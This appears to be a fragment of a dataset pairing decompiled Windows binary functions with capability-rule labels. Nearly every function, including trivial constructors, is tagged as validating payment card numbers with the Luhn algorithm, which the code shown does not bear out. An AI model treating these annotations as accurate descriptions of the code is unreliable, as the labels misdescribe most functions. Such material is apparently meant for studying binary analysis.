        "decompiled_code": "\nvoid fcn.0041b9e4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStackY32;\n    uint uStackY28;\n    uchar *puStackY24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY24 = 0x41ba00;\n    fcn.0041c258(0x1000);\n    uStackY28 = 0x41ba34;\n    uStackY32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStackY24 = &stack0xfffffffc;\n    fcn.0041e4a0();\n    *in_FS_OFFSET = uStackY32;\n    puStackY24 = 0x41ba3b;\n    uStackY28 = 0x41ba33;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 195
    },
    "0041ba44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041ba44(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 163
    },
    "0041bb08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041bb08(uint32_t arg_8h)\n\n{\n    uint in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_DL = extraout_DL;\n    }\n    uVar1 = 0;\n    fcn.0041bb4c(0, arg_8h & 0xffff);\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 149
    },
    "0041bf4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041bf4c(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    fcn.004054c0();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 138
    },
    "0041c0ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c0ac(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint noname_0;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_DL = extraout_DL;\n    }\n    fcn.00404610();\n    noname_0 = 0;\n    fcn.004058fc();\n    fcn.0041c1a4(noname_0, arg_8h);\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = noname_0;\n    }\n    return in_EAX;\n}\n",
        "token_count": 170
    },
    "0041c258": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041c258(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    uVar1 = fcn.00402ef0();\n    *(in_EAX + 8) = uVar1;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 208
    },
    "0041c3a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041c3a4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_14h;\n    *(in_EAX + 0xc) = arg_10h;\n    fcn.004054c0();\n    fcn.004054c0();\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 226
    },
    "0041c944": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041c944(void)\n\n{\n    uchar auStack12 [4];\n    uchar uStack8;\n    \n    uStack8 = 0xb;\n    fcn.0040db68(0, auStack12);\n    fcn.00404eb4();\n    return;\n}\n",
        "token_count": 64
    },
    "0041ce54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0041ce54(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int32_t iStack20;\n    \n    iVar2 = fcn.00404518();\n    do {\n        if (iVar2 == *0x4174bc) {\n            if (*(in_EAX + 0x84) == 0) {\n                uVar4 = fcn.00418ee4();\n            }\n            else {\n                uVar4 = fcn.00418de4();\n            }\n            return uVar4;\n        }\n        piVar3 = fcn.00418e6c();\n        if ((piVar3 != NULL) && (iVar2 = *piVar3,  -1 < iVar2 + -1)) {\n            iStack20 = 0;\n            do {\n                uVar4 = **(piVar3 + iStack20 * 2 + 1);\n                cVar1 = fcn.00404534();\n                if (cVar1 != '\\0') {\n                    return uVar4;\n                }\n                iStack20 = iStack20 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iVar2 = fcn.004045cc();\n    } while( true );\n}\n",
        "token_count": 302
    },
    "0041d080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d080(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x41d093;\n    (**(*param_2 + 0x20))();\n    uStack24 = 0x41d120;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    cVar1 = fcn.0041cb0c();\n    if (cVar1 == '\\0') {\n        fcn.00419ffc();\n    }\n    while( true ) {\n        cVar1 = fcn.0041cb0c();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.0041cf04();\n        if (cVar1 - 2U < 3) {\n            fcn.0041db10();\n        }\n        fcn.00419fdc();\n        fcn.0041dbc0();\n        while( true ) {\n            cVar1 = fcn.0041cb0c();\n            if (cVar1 != '\\0') break;\n            fcn.0041dd2c();\n        }\n        fcn.0041dbc8();\n    }\n    fcn.0041dbc8();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41d127;\n    uStack24 = 0x41d11f;\n    (**(*param_2 + 0x24))();\n    return;\n}\n",
        "token_count": 375
    },
    "0041d7f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041d7f0(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    while( true ) {\n        puStack32 = 0x41d812;\n        cVar3 = fcn.0041cb0c();\n        if (cVar3 != '\\0') break;\n        puStack32 = 0x41d80a;\n        fcn.0041dd2c();\n    }\n    puStack32 = 0x41d81e;\n    fcn.0041dbc8();\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = *(in_EAX + 0x28);\n    puStack32 = 0x41d83b;\n    uVar4 = fcn.0040483c();\n    *(in_EAX + 0x2c) = uVar4;\n    uStack36 = 0x41d8b2;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar5 = fcn.0040483c();\n    *(in_EAX + 0x28) = iVar5;\n    if (iVar5 == 0) {\n        *(in_EAX + 0x28) = *(in_EAX + 0x18);\n    }\n    while( true ) {\n        cVar3 = fcn.0041cb0c();\n        if (cVar3 != '\\0') break;\n        fcn.0041d540();\n    }\n    fcn.0041dbc8();\n    *in_FS_OFFSET = uStack40;\n    *(in_EAX + 0x2c) = uVar1;\n    *(in_EAX + 0x28) = uVar2;\n    return;\n}\n",
        "token_count": 472
    },
    "0041d8f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041d8f8(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    double dStack20;\n    \n    cVar2 = fcn.0041ea90();\n    if (cVar2 == '\\x15') {\n        fcn.0041cf28();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041db7c();\n        dStack20 = iVar1;\n    }\n    return dStack20;\n}\n",
        "token_count": 138
    },
    "0041d93c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041d93c(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    float fStack16;\n    \n    cVar2 = fcn.0041ea90();\n    if (cVar2 == '\\x0f') {\n        fcn.0041cf28();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041db7c();\n        fStack16 = iVar1;\n    }\n    return fStack16;\n}\n",
        "token_count": 138
    },
    "0041d980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041d980(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int64_t iStack20;\n    \n    cVar2 = fcn.0041ea90();\n    if (cVar2 == '\\x10') {\n        fcn.0041cf28();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041db7c();\n        iStack20 = ROUND(iVar1 * *0x41d9cc);\n    }\n    return iStack20;\n}\n",
        "token_count": 148
    },
    "0041d9d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041d9d0(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    double dStack20;\n    \n    cVar2 = fcn.0041ea90();\n    if (cVar2 == '\\x11') {\n        fcn.0041cf28();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041db7c();\n        dStack20 = iVar1;\n    }\n    return dStack20;\n}\n",
        "token_count": 138
    },
    "0041db10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041db10(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    char cStack8;\n    uchar uStack7;\n    int16_t iStack6;\n    \n    cVar1 = fcn.0041ea90();\n    if (cVar1 == '\\x02') {\n        fcn.0041cf28();\n        iStack12 = cStack8;\n    }\n    else if (cVar1 == '\\x03') {\n        fcn.0041cf28();\n        iStack12 = iStack6;\n    }\n    else if (cVar1 == '\\x04') {\n        fcn.0041cf28();\n    }\n    else {\n        fcn.0041c938();\n    }\n    return CONCAT26(iStack6, CONCAT15(uStack7, CONCAT14(cStack8, iStack12)));\n}\n",
        "token_count": 188
    },
    "0041db7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041db7c(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    int32_t iStack8;\n    \n    cVar1 = fcn.0041cf04();\n    if (cVar1 == '\\x13') {\n        fcn.0041ea90();\n        fcn.0041cf28();\n    }\n    else {\n        iStack12 = fcn.0041db10();\n        iStack8 = iStack12 >> 0x1f;\n    }\n    return CONCAT44(iStack8, iStack12);\n}\n",
        "token_count": 127
    },
    "0041df84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041df84(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = fcn.004191cc();\n    if ((pcVar2 != NULL) && (cVar1 = (*pcVar2)(),  cVar1 != '\\0')) {\n        fcn.00416624();\n        return;\n    }\n    fcn.0041c938();\n    return;\n}\n",
        "token_count": 108
    },
    "0041e440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e440(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004054c0();\n    while( true ) {\n        cVar1 = fcn.00419364();\n        if (cVar1 != '\\0') break;\n        fcn.0040af7c(param_2);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0041e8f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041e8f0(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41e99d;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.0041cf04();\n    if ((cVar1 == '\\x12') || (cVar1 == '\\x14')) {\n        fcn.0041e9ac();\n        fcn.004056f4();\n    }\n    else {\n        cVar1 = fcn.0041ea90();\n        if (cVar1 == '\\x06') {\n            fcn.0041cf28();\n        }\n        else if (cVar1 == '\\f') {\n            fcn.0041cf28();\n        }\n        else {\n            fcn.0041c938();\n        }\n        fcn.00405b8c();\n        fcn.0041cf28();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41e9a4;\n    uStack28 = 0x41e99c;\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 311
    },
    "0041e9ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041e9ac(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41ea83;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.0041cf04();\n    if ((cVar1 == '\\x06') || (cVar1 == '\\f')) {\n        fcn.0041e8f0();\n        fcn.00405dc8();\n    }\n    else {\n        cVar1 = fcn.0041ea90();\n        if (cVar1 == '\\x12') {\n            fcn.0041cf28();\n            fcn.00405ec4();\n            fcn.0041cf28();\n        }\n        else if (cVar1 == '\\x14') {\n            fcn.0041cf28();\n            fcn.00405b8c();\n            fcn.0041cf28();\n            fcn.004074ec();\n        }\n        else {\n            fcn.0041c938();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41ea8a;\n    uStack32 = 0x41ea7a;\n    fcn.0040546c();\n    uStack32 = 0x41ea82;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 360
    },
    "0041ed98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __fastcall fcn.0041ed98(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack32 = &fcn.0041ed98::var_1h + 1;\n    uStack36 = 0x41ee30;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = &fcn.0041ed98::var_1h + 1;\n    if (param_2 != '\\0') {\n        (**(*in_EAX + 0x28))();\n        fcn.0041e8b4();\n        fcn.0041e8b4();\n        puVar1 = puStack32;\n    }\n    while( true ) {\n        puStack32 = puVar1;\n        cVar2 = fcn.0041cb0c();\n        if (cVar2 != '\\0') break;\n        fcn.0041ed50();\n        puVar1 = puStack32;\n    }\n    fcn.0041dbc8();\n    while( true ) {\n        cVar2 = fcn.0041cb0c();\n        if (cVar2 != '\\0') break;\n        fcn.0041ed98();\n    }\n    fcn.0041dbc8();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41ee37;\n    uStack36 = 0x41ee2f;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 416
    },
    "0041efac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041efac(uint param_1, int32_t param_2)\n\n{\n    if (0 < param_2) {\n        do {\n            if (param_2 < 0x101) {\n                fcn.0041cf28();\n                param_2 = 0;\n            }\n            else {\n                fcn.0041cf28();\n                param_2 = param_2 + -0x100;\n            }\n        } while (0 < param_2);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0041eff4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041eff4(uint arg_8h)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41f19d;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x41f020;\n    fcn.0041c9c4();\n    puStack52 = 0x41f031;\n    fcn.00404610();\n    uStack56 = 0x41f178;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00404610();\n    fcn.0041cf28();\n    fcn.0041b6d8(var_18h, var_18h >> 0x1f);\n    fcn.0041cf28();\n    puStack76 = 0x41f09a;\n    fcn.0041c258(0x400);\n    uStack80 = 0x41f153;\n    iStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    puStack76 = &stack0xfffffffc;\n    fcn.0041e8f0();\n    fcn.0041cf28();\n    fcn.0041b6d8(var_18h, var_18h >> 0x1f);\n    fcn.0041cf28();\n    cVar1 = fcn.004161e0();\n    if (cVar1 != '\\0') {\n        fcn.004070f8();\n        cVar1 = fcn.0040f8ec();\n        if (cVar1 != '\\0') goto code_r0x0041f126;\n    }\n    fcn.0040db2c();\n    fcn.00404eb4();\ncode_r0x0041f126:\n    *in_EAX = *(var_1ch + 4);\n    (**(_pe_dos_header + 0xc))();\n    *in_FS_OFFSET = var_18h;\n    iStack84 = 0x41f15a;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 630
    },
    "0041f838": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041f838(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x24) = *0x41f880;\n    if (param_1 != 0) {\n        fcn.0041f9f4();\n    }\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 188
    },
    "0041fda8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fda8(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    bool bVar2;\n    int32_t iStack20;\n    uchar uStack16;\n    \n    bVar2 = *0x10 == 0x14;\n    fcn.00405894();\n    if (!bVar2) {\n        if (param_2 != 0) {\n            cVar1 = fcn.00409bd0();\n            if (cVar1 == '\\0') {\n                uStack16 = 0xb;\n                iStack20 = param_2;\n                fcn.0040db68(0, &iStack20);\n                fcn.00404eb4();\n            }\n        }\n        if (in_EAX[1] == NULL) {\n            (**(*in_EAX + 0x20))(param_2);\n        }\n        else {\n            (**(*in_EAX[1] + 0x20))(param_2);\n        }\n        fcn.0041ff2c();\n        fcn.0041fe38();\n        fcn.0041ff2c();\n    }\n    return;\n}\n",
        "token_count": 264
    },
    "0041ff2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ff2c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    if (*(in_EAX + 4) != 0) {\n        fcn.00405708();\n        piVar1 = fcn.00404914();\n        if (piVar1 != NULL) {\n            if (param_2 == '\\0') {\n                *piVar1 = 0;\n            }\n            else {\n                *piVar1 = in_EAX;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "0042015c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042015c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0041f838();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0x50) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 167
    },
    "00420354": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00420354(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 0xc) = in_ECX;\n    *(in_EAX + 0x10) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 184
    },
    "004208d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004208d0(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code **in_ECX;\n    \n    (**in_ECX)(arg_ch, arg_10h, arg_14h);\n    return 0;\n}\n",
        "token_count": 67
    },
    "00420ea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00420ea0(void)\n\n{\n    uchar auStack12 [4];\n    uchar uStack8;\n    \n    uStack8 = 0xb;\n    fcn.0040db68(0, auStack12);\n    fcn.00404eb4();\n    return;\n}\n",
        "token_count": 64
    },
    "00420f38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00420f38(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00421014();\n    *(in_EAX + 0x18) = 0xf003f;\n    *(in_EAX + 0xc) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 164
    },
    "00420f7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00420f7c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00420f38();\n    *(in_EAX + 0x18) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 167
    },
    "0042107c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042107c(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint hKey;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack44 = 0x421148;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    hKey = 0;\n    fcn.00405504();\n    cVar1 = fcn.00420ecc();\n    if (cVar1 == '\\0') {\n        fcn.004059a4();\n    }\n    uVar2 = fcn.004058fc(0, 0, 0, 0xf003f, 0, &fcn.0042107c::hKey, &fcn.0042107c::var_ch);\n    uVar2 = fcn.00421064(uVar2);\n    iVar3 = sub.advapi32.dll_RegCreateKeyExA(uVar2);\n    if (iVar3 == 0) {\n        uVar2 = 0x42110c;\n        sub.advapi32.dll_RegCloseKey_1(hKey);\n    }\n    else {\n        var_10h._0_1_ = 0xb;\n        uVar2 = 0;\n        var_14h = param_2;\n        fcn.0040db68(0, &fcn.0042107c::var_14h);\n        fcn.00404eb4();\n    }\n    *in_FS_OFFSET = uVar2;\n    fcn.0040546c(0x42114f);\n    return;\n}\n",
        "token_count": 434
    },
    "0042164c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry key"
        ],
